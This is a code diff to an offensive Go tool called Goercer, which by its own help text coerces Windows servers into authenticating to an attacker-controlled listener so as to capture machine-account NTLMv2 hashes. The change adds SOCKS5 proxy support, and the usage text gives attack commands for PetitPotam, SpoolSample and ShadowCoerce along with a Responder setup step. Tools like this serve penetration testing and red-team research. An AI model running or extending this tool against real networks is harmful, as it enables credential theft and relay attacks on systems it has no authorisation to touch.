@@ -37,6 +37,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"net/url"
 	"os"
 	"time"
 	"unicode/utf16"
@@ -44,6 +45,7 @@ import (
 	"github.com/jfjallid/go-smb/smb"
 	"github.com/jfjallid/go-smb/spnego"
 	"golang.org/x/crypto/md4"
+	"golang.org/x/net/proxy"
 )
 
 const (
@@ -125,7 +127,7 @@ func main() {
 		if arg == "-h" || arg == "--help" {
 			fmt.Println("Goercer - NTLM Coercion Attack Tool")
 			fmt.Println("====================================\n")
-			fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]\n")
+			fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe] [--proxy socks5://host:port]\n")
 			fmt.Println("Description:")
 			fmt.Println("  Coerces Windows servers to authenticate to an attacker-controlled listener,")
 			fmt.Println("  capturing machine account NTLMv2 hashes via Responder or ntlmrelayx.\n")
@@ -163,6 +165,8 @@ func main() {
 			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local spoolsample\n")
 			fmt.Println("  # ShadowCoerce (only if VSS is configured)")
 			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local shadowcoerce\n")
+			fmt.Println("  # Use SOCKS5 proxy")
+			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local petitpotam lsarpc --proxy socks5://127.0.0.1:1080\n")
 			fmt.Println("Arguments:\n")
 			fmt.Println("  <target_ip>    : IP address of the target server to coerce")
 			fmt.Println("  <listener_ip>  : IP address where Responder/ntlmrelayx is listening")
@@ -170,7 +174,8 @@ func main() {
 			fmt.Println("  <password|hash>: User's password OR NTLM hash (32 hex characters)")
 			fmt.Println("  <domain>       : Domain name (e.g., 'CORP' or 'corp.local')")
 			fmt.Println("  [method]       : Coercion method (default: petitpotam)")
-			fmt.Println("  [pipe]         : Named pipe (only for petitpotam, default: lsarpc)\n")
+			fmt.Println("  [pipe]         : Named pipe (only for petitpotam, default: lsarpc)")
+			fmt.Println("  [--proxy URL]  : SOCKS5 proxy (e.g., socks5://127.0.0.1:1080)\n")
 			fmt.Println("Workflow:\n")
 			fmt.Println("  1. Start Responder: sudo responder -I eth0 -v")
 			fmt.Println("  2. Run goercer against target server")
@@ -207,17 +212,35 @@ func main() {
 	domain := os.Args[5]
 	methodName := "petitpotam"
 	pipeName := "lsarpc" // Default pipe for petitpotam
-	if len(os.Args) >= 7 {
-		methodName = os.Args[6]
-	}
-	if len(os.Args) >= 8 {
-		pipeName = os.Args[7]
+	var proxyURL string
+
+	// Parse optional arguments
+	for i := 6; i < len(os.Args); i++ {
+		if os.Args[i] == "--proxy" && i+1 < len(os.Args) {
+			proxyURL = os.Args[i+1]
+			i++ // Skip next arg
+		} else if i == 6 {
+			methodName = os.Args[i]
+		} else if i == 7 && os.Args[i] != "--proxy" {
+			pipeName = os.Args[i]
+		}
 	}
 
 	// SMB connection - detect if password is actually a hash
 	options := smb.Options{
 		Host: targetIP,
 		Port: 445,
+	}
+
+	// Setup SOCKS5 proxy if specified
+	if proxyURL != "" {
+		fmt.Printf("[+] Using SOCKS5 proxy: %s\n", proxyURL)
+		dialer, err := proxy.FromURL(&url.URL{Scheme: "socks5", Host: proxyURL[len("socks5://"):]}, proxy.Direct)
+		if err != nil {
+			fmt.Printf("[!] Failed to create proxy dialer: %v\n", err)
+			os.Exit(1)
+		}
+		options.ProxyDialer = dialer
 	}
 
 	// Check if password is an NTLM hash (32 hex chars)
